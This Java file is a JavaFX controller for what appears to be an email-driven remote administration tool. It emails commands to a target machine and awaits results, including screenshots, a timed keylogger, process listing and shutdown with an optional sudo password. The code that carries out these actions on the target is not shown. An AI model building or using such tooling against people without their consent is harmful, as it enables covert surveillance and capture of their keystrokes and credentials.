package com.ui.server;

import com.util.CheckMail;
import com.util.SendMail;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.input.InputMethodEvent;
import javafx.scene.layout.VBox;
import javafx.scene.text.Font;
import javafx.scene.text.Text;

import javax.mail.MessagingException;
import java.io.IOException;
import java.util.List;
import java.util.Random;

public class sendMailController {
    Random random = new Random();
    @FXML
    public Button sendBut;
    @FXML
    public VBox textOutputs;
    @FXML
    public TextField addField;
    @FXML
    public ComboBox<String> comboBox;
    @FXML
    public Label labelAddField;


    public void logText(String log, String color) {
        Text text = new Text(log);
        text.setStyle("-fx-fill: " + color);
        text.setFont(new Font("Arial",15));
        text.wrappingWidthProperty().set(540);
        Platform.runLater(() -> {
            if (textOutputs.getHeight() > 380)
                textOutputs.getChildren().clear();
            textOutputs.getChildren().add(text);
        });
    }

    public void initialize() {
        List<String> list = List.of("Snapshot", "KeyLogger", "ListProcess", "StopProcess", "OpenProcess", "Shutdown");
        comboBox.setItems(FXCollections.observableList(list));
        comboBox.getSelectionModel().selectFirst();
        addField.setEditable(false);
        comboBox.getSelectionModel().selectedItemProperty().addListener(
                (observableValue, s, t1) -> {
                    if (t1.equals("Snapshot")) {
                        addField.setDisable(true);
                        addField.setEditable(false);
                        labelAddField.setText("Not Available");
                        sendBut.setDisable(false);
                    } else if (t1.equals("KeyLogger")) {
                        addField.setDisable(false);
                        labelAddField.setText("Time to log in milliseconds");
                        sendBut.setDisable(false);
                        addField.setEditable(true);
                    }
                    else if (t1.equals("Shutdown")) {
                        addField.setDisable(false);
                        labelAddField.setText("Your Password (Optional)");
                        sendBut.setDisable(false);
                        addField.setEditable(true);
                    }
                    else if(t1.equals("ListProcess")){
                        addField.setDisable(true);
                        addField.setEditable(false);
                        labelAddField.setText("Nothing here");
                        sendBut.setDisable(false);
                    }
                    else {
                        sendBut.setDisable(true);
                    }

                }
        );

    }


    public void sendButAction(ActionEvent actionEvent) {
        String choose = comboBox.getSelectionModel().getSelectedItem();
        //snapshot task
        if (choose.equals("Snapshot")) {
            int id = random.nextInt(1000, 9999);

            sendBut.setDisable(true);
            Thread thread = new Thread(() -> {
                try {
                    System.out.println(Thread.currentThread().getName());
                    SendMail.getInstance().sendMail("req / " + id + " / " + "takeshot");
                    logText("ID: " + id + " Send Mail Successfully! Wait for response!", "green");
                    String a = CheckMail.getInstance().listen(id, 40);
                    if (a != null) {
                        logText("Get Response successfully. File in " + a, "green");
                        Platform.runLater(() -> {
                            sendBut.setDisable(false);
                        });
                    } else {
                        logText("Error happens", "red");
                    }
                } catch (IOException | MessagingException e) {
                    logText(e.getMessage(), "red");
                    Platform.runLater(()->{
                        sendBut.setDisable(false);
                    });
                    e.printStackTrace();
                }
            });
            thread.start();

        }
        //key log task
        else if (choose.equals("KeyLogger")) {
            try {
                int time = Integer.parseInt(addField.getText());
                if (time < 0) {
                    throw new NumberFormatException();
                } else if (time < 1000) {
                    logText("Too small time to listen", "yellow");
                } else {
                    sendBut.setDisable(true);
                    int id = random.nextInt(1000,9999);
                    Thread thread = new Thread(() -> {
                        try {
                            System.out.println(Thread.currentThread().getName());
                            SendMail.getInstance().sendMail("req / " + id + " / " + "keylog /" + time);
                            logText("ID: " + id + " Send Mail Successfully! Wait for response!", "green");
                            String a = CheckMail.getInstance().listen(id, 43 + time / 1000);
                            if (a != null) {
                                logText("Get Response successfully. File in " + a, "green");
                                Platform.runLater(() -> {
                                    sendBut.setDisable(false);
                                });
                            } else {
                                logText("Error happens", "red");
                            }
                        } catch (IOException | MessagingException e) {
                            logText(e.getMessage(), "red");
                            e.printStackTrace();
                        }
                    });
                    thread.start();
                }
            }
            catch (NumberFormatException e) {
                logText("Please enter an valid time!", "red");
            }
        }
        else if (choose.equals("Shutdown")) {
            int id = random.nextInt(1000, 9999);
            String sudopass = addField.getText();

            sendBut.setDisable(true);
            Thread thread = new Thread(() -> {
                try {
                    System.out.println(Thread.currentThread().getName());
                    SendMail.getInstance().sendMail("req / " + id + " / " + "Shutdown/"+sudopass);
                    logText("ID: " + id +"Password: "+sudopass+ " Send Mail Successfully! If there is a response, It means an error has occured!", "green");
                } catch (IOException | MessagingException e) {
                    logText(e.getMessage(), "red");
                    e.printStackTrace();
                }
            });
            thread.start();
        } else if (choose.equals("ListProcess")) {
            int id = random.nextInt(1000,9999);
            sendBut.setDisable(true);
            Thread thread = new Thread(() -> {
                try {
                    System.out.println(Thread.currentThread().getName());
                    SendMail.getInstance().sendMail("req / " + id + " / " + "ListProcess");
                    logText("ID: " + id + " Send Mail Successfully! Wait for response!", "green");
                    String a = CheckMail.getInstance().listen(id, 40);
                    if (a != null) {
                        logText("Get Response successfully. File in " + a, "green");
                        Platform.runLater(() -> {
                            sendBut.setDisable(false);
                        });
                    } else {
                        logText("Error happens", "red");
                    }
                } catch (IOException | MessagingException e) {
                    logText(e.getMessage(), "red");
                    e.printStackTrace();
                }
            });
            thread.start();
        }
    }

    public void idChange(InputMethodEvent inputMethodEvent) {

    }
}
